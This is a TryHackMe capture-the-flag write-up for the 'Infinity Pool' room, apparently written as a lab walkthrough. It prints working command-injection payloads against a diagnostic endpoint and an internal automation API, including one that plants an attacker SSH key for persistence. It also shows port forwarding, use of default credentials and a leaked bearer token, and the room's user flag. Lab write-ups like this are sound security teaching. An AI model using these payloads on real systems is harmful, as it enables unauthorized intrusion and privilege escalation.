# TryHackMe Writeup: Infinity Pool

**Room Link:** [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)  
**Difficulty:** Medium  
**Category:** Boot2Root  

---

## 1. Executive Summary
The "Infinity Pool" room presents a medium-difficulty Boot2Root challenge themed around a hotel's internal systems. The engagement involves performing external reconnaissance to discover an exposed diagnostic utility, which suffers from a severe command injection vulnerability. Exploiting this flaw provides initial access to the system. Subsequent post-exploitation efforts reveal internal services, specifically an operations console and an automation service. By harvesting leaked credentials and an authorization token from these internal portals, a second command injection vulnerability is exploited to achieve root-level privileges.

---

## 2. Reconnaissance and Enumeration

Initial reconnaissance was conducted utilizing Nmap to identify exposed services and ports on the target infrastructure.

```bash
nmap -sV -sC -p- 10.113.184.65
```

**Nmap Output Summary:**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
| http-robots.txt: 2 disallowed entries 
|_/internal/ /status
|_http-title: Byte Lotus &mdash; Stay Noticed
```

The scan revealed two primary listening services:
- **Port 22 (SSH):** OpenSSH 9.6p1
- **Port 80 (HTTP):** A web application powered by Gunicorn.

Crucially, the `robots.txt` file exposed two restricted endpoints: `/internal/` and `/status`.

---

## 3. Vulnerability Identification & Initial Access

### 3.1 Analyzing the Web Application
Navigating to the `/status` endpoint revealed a "Sister-property connectivity" network diagnostic tool. The application prompted for an IP address to execute a `ping` command, submitting a `POST` request to `/internal/netcheck` with a `host` parameter. 

Network diagnostic tools that parse user input directly into shell commands are historically prone to OS Command Injection if proper sanitization is absent.

### 3.2 Exploiting Command Injection
By intercepting the HTTP request via a local proxy (e.g., Burp Suite), the `host` parameter was manipulated to include shell metacharacters (such as `;`), allowing arbitrary command execution.

**Proof of Concept (whoami):**
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; whoami
```
The response successfully returned the context of a low-privileged service account.

### 3.3 Establishing Persistence and Retrieving User Flag
To upgrade from a blind/web shell to a stable terminal environment, the command injection vulnerability was leveraged to append an attacker-controlled public SSH key to the service account's `authorized_keys` file.

**Exploit Payload:**
```http
POST /internal/netcheck HTTP/1.1
Host: 10.113.184.65
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1; echo 'ssh-rsa AAAAB3NzaC1yc... [TRUNCATED] ... attacker@kali' >> ~/.ssh/authorized_keys
```

With the public key successfully injected, a stable SSH connection was established, granting interactive access to the host.

```bash
ssh -i ~/.ssh/id_rsa web@10.113.184.65
```

Upon logging in, the first objective was secured.

**User Flag:**
```bash
cat user.txt
THM{n0_v1s1bl3_3dg3}
```

---

## 4. Privilege Escalation

### 4.1 Internal Network Discovery
With interactive access secured, local enumeration was performed to identify internal services bound to the loopback interface (`127.0.0.1`).

```bash
ss -tln
```
This revealed active listeners on **Port 3000** and **Port 9000**. To interface with these services, SSH local port forwarding was utilized to tunnel traffic from the attacker machine.

```bash
ssh -L 3000:127.0.0.1:3000 -L 9000:127.0.0.1:9000 -i ~/.ssh/id_rsa web@10.113.184.65
```

### 4.2 Credential Harvesting & Token Leakage
Navigating to `http://127.0.0.1:3000` presented an internal "Watchtower" operations console. Enumeration of this console yielded default/unrotated credentials (such as `admin:admin`) for a FreePBX User Control Panel (UCP).

Following successful authentication into the FreePBX UCP, further inspection of the dashboard's network traffic and widget configurations (specifically the voicemail widget) uncovered a leaked **Automation Key**. This key functioned as a Bearer token for internal API requests.

### 4.3 Exploiting the Automation Service
Port 9000 hosted the internal Automation Service, operating with `root` privileges. Access to its endpoints required the previously discovered Bearer token.

Reviewing the API structure revealed the `/jobs/export` endpoint, which accepts a `report` parameter. Similar to the initial vector, this endpoint failed to sanitize input before passing it to a system shell. 

Using the extracted Authorization token, a final command injection payload was constructed to execute commands as root and retrieve the final flag.

**Exploit Payload:**
```bash
curl -H "Authorization: Bearer <EXTRACTED_AUTOMATION_KEY>" -X POST http://127.0.0.1:9000/jobs/export -d 'report=1; cat /root/root.txt'
```

**Root Flag:**
```text
THM{REDACTED_BY_AUTHOR}
```
*(Note: The final flag value is intentionally redacted here to comply with TryHackMe's guidelines against publishing root flags.)*

The system was successfully compromised, and all objectives were achieved.
